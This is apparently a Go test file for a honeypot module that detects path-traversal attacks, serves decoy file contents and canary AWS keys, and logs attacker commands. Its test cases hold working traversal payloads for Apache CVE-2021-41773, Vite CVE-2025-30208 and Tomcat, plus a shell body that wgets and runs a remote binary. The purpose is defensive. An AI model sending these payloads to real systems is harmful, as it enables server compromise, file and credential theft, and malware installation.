package traversal

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"slices"
	"strings"
	"testing"

	"agenttrap/modules"
)

// newReq builds a request whose raw target is exactly target, even when the
// target is not a valid URL (the server keeps such raw targets as sent).
func newReq(method, target, body string) *http.Request {
	u := "http://203.0.113.9" + target
	if _, err := url.Parse(u); err != nil {
		u = "http://203.0.113.9/"
	}
	r := httptest.NewRequest(method, u, strings.NewReader(body))
	r.RequestURI = target
	return r
}

func TestClaim(t *testing.T) {
	m := New()
	cases := []struct {
		target, surface string
		want            modules.Claim
	}{
		{"/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", "", modules.Attack},
		{"/icons/.%2e/%2e%2e/apache2/icons/../../../../etc/passwd", "www", modules.Attack},
		{"/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh", "", modules.Attack},
		{"/@fs/%252e%252e/%252e%252e/etc/passwd?import&?inline=1.wasm", "", modules.Attack},
		{"/..;/manager/html", "docs", modules.Attack},
		{"/static/..%2f..%2f..%2fetc/passwd", "", modules.Attack},
		{"/cgi-bin/.%2e/.%2e/bin/sh", "api", modules.Pass},
		{"/docs/getting-started", "www", modules.Pass},
		{"/a..b/file.txt", "", modules.Pass},
	}
	for _, c := range cases {
		if got := m.Claim(modules.Request{Request: newReq("GET", c.target, ""), Surface: c.surface}); got != c.want {
			t.Errorf("%s on %q: claim %v want %v", c.target, c.surface, got, c.want)
		}
	}
}

func TestApacheShellCapturesCommands(t *testing.T) {
	body := "echo Content-Type: text/plain; echo; id; cd /tmp; wget http://198.51.100.7/x86 -O k; chmod +x k; ./k"
	r := newReq("POST", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", body)
	w := httptest.NewRecorder()
	hit := New().Serve(w, modules.Request{Request: r})
	if hit.Attack != attackApache || hit.Stage != modules.StageExploit || !slices.Contains(hit.CVE, "CVE-2021-41773") {
		t.Fatalf("hit %+v", hit)
	}
	if w.Body.String() != "uid=1(daemon) gid=1(daemon) groups=1(daemon)\n" {
		t.Fatalf("output %q", w.Body.String())
	}
	cmds, _ := hit.Detail["commands"].([]string)
	if len(cmds) == 0 || cmds[0] != "id" || !slices.Contains(cmds, "wget http://198.51.100.7/x86 -O k") {
		t.Fatalf("commands %v", cmds)
	}
	if urls, _ := hit.Detail["urls"].([]string); !slices.Contains(urls, "http://198.51.100.7/x86") {
		t.Fatalf("urls %v", hit.Detail["urls"])
	}
}

func TestFileReads(t *testing.T) {
	cases := []struct {
		target, want string
		code         int
	}{
		{"/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "www-data:x:33:33", 200},
		{"/static/..%252f..%252f..%252fetc/passwd", "root:x:0:0", 200},
		{"/static/../../../etc/shadow", "404 Not Found", 404},
		{"/..;/manager/html", "Apache Tomcat", 401},
		{"/x/..%5c..%5cwindows/win.ini", "[fonts]", 200},
	}
	for _, c := range cases {
		w := httptest.NewRecorder()
		New().Serve(w, modules.Request{Request: newReq("GET", c.target, "")})
		if w.Code != c.code || !strings.Contains(w.Body.String(), c.want) {
			t.Errorf("%s: %d %.80q", c.target, w.Code, w.Body.String())
		}
	}
}

func TestViteModuleWrapAndCanary(t *testing.T) {
	var revealed []string
	reveal := func(slot string) string { revealed = append(revealed, slot); return "AKIACANARY0000000001" }
	w := httptest.NewRecorder()
	r := newReq("GET", "/@fs/proc/self/environ?import&raw??", "")
	hit := New().Serve(w, modules.Request{Request: r, Reveal: reveal})
	if hit.Attack != attackVite || !slices.Contains(hit.CVE, "CVE-2025-30208") {
		t.Fatalf("hit %+v", hit)
	}
	b := w.Body.String()
	if !strings.HasPrefix(b, `export default "`) || !strings.Contains(b, "AWS_ACCESS_KEY_ID=AKIACANARY0000000001") ||
		w.Header().Get("Content-Type") != "text/javascript" {
		t.Fatalf("vite body %q", b)
	}
	if !slices.Equal(revealed, []string{"aws_access_key_id"}) {
		t.Fatalf("revealed %v", revealed)
	}
	// Without a persona the environ still carries a well-formed key.
	w = httptest.NewRecorder()
	New().Serve(w, modules.Request{Request: newReq("GET", "/a/../../proc/self/environ", "")})
	if !strings.Contains(w.Body.String(), "AWS_ACCESS_KEY_ID=AKIA") {
		t.Fatalf("fallback environ %q", w.Body.String())
	}
}
